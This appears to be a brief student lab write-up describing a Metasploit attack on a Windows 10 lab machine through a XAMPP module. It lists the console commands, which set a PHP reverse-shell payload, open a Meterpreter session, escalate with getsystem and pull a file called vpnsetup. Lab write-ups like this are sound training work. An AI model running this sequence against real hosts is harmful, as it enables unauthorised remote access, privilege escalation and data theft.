For gaining remote access, used msfconsole, xampp, payloads, meterpreter. Created sessions using payloads.

Command Used: 
msfconsole
search xampp
show options
set RHOSTS 10.1.2.4
run
show payloads
set payload php/reverse_phppayload => php/reverse_php
sessions
set session 1
sessiona -i 1	
getuid
getsystem

By those command and steps, we got access of win10 machine and also used win10 remote access for running the payload. Without any problem, managed to bring a file name vpnsetup from win10 machine.
This is marked in redbox in the output picture.
